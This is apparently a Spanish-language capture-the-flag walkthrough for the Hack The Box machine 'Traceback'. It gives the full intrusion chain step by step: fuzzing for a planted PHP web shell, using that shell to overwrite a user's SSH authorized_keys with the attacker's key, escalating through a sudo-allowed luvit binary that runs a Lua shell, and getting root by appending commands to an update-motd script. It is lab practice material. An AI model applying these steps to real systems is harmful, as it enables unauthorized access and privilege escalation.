@@ -1,0 +1,91 @@
+Nota para Traceback
+
+nmap -n -A -o scan.tracerback.txt 10.10.10.181
+
+iremo a la siguiente web:
+https://github.com/TheBinitGhimire/Web-Shells
+
+Debemos descargaremos todo los nombre de shell de este site y lo pondremos en txt.
+
+El cual llamaremos: rsearch.txt
+
+Luego buscaremos coincidencia de las misma con el siguiente comando.
+wfuzz -c -z file,'rsearch.txt' http://10.10.10.181/FUZZ
+
+Encontraremos 
+
+000000015: 200 58 L 100 W 1261 Ch "smevk.php" 
+
+Debemos ejecutar ahora
+http://10.10.10.181/smevk.php
+
+
+en este panel debemos escribir "Change Dir" 
+/home/
+luego ir a directorio .ssh
+aqui debemos crear nuestra propia llave de ssh pub y priva para conectarno
+
+tomaremos el nombre del archivo {authorized_key} el cual pondremo nuestra llave publica.
+
+Como generamos nuestra llave.
+En nuestra maquina iremos a {home} de nuestro usuario y accederemos al directorio {.ssh}
+# ssh-keygen <enter>
+
+[+] Enter file in which to save the key (/home/ylo/.ssh/id_rsa): <presionadmos enter>
+
+Enter passphrase (empty for no passphrase): digitamos nuestra clave
+Enter same passphrase again: = confirmamos la clave
+
+esto debe generar dos archivo:
+id_rsa = llave privada
+id_rsa.pub = Llave publica
+
+
+motaremos el contenido de la llave publica{id_rsa.pub} creamos un archivo llamado {authorized_key} y este tendra la llave publica.
+
+Ahora debemos volver al portal {http://10.10.10.181/smevk.php} volver al directorio 
+/home/webadmin/.ssh/ aqui eliminaremos el archivo authorized_key 
+luego cargaremos nuestro archivo authorized_key.
+
+Ahora solo debemos hacer lo siguiente:
+al archivo id_rsa debemos cambiar el permiso para poder utilizarlo.
+
+# chmod 444 id_rsa
+
+Ahora debemos conectarno a la maquina de la siguiente manera.
+
+# ssh -i id_rsa webadmin@10.10.10.181
+
+Si todo va bien solo debemos poner la clave con la cual generamos la llave pub y privada.
+
+Una vez dentro podemos ver un archivo llamado {trace.lua} cual el cual podriamo subir de privilegio
+continuando revisando su ejecutamos {ps aux} podemos ver un procesoo que esta llamando lo siguiente {sudo -u sysadmin /home/sysadmin/luvit} entre otra cosas, pero solo tomaremos esta parte.
+
+Ahora tenemos lo siguiente:
+sudo -u sysadmin /home/sysadmin/luvit
+
+El contenido del archivo trace.lua
+os.execute("/bin/bash -i")
+
+Por lo que si ejecutamos:
+
+# sudo -u sysadmin /home/sysadmin/luvit trace.lua ya seriamo sysadmin
+# whoami
+# sysadmin 
+# cd /home/sysadmin
+# cat user.txt
+
+Ahora para conseguir el root iremos:
+
+# cd /etc/update-motd.d/
+# cat 00-header
+
+Este archivo nos muestra una forma particualar de ejecutar algo al momento de iniciar session ssh
+
+# echo "cat /root/root.txt" >> 00-header
+
+Inmediatamente abriremos otra terminal y nos conectaremos otra vez via ssh.
+
+# ssh -i id_rsa webadmin@10.10.10.181
+
+Al conectarno en el welcome del ssh debe aparecer la flag del root.
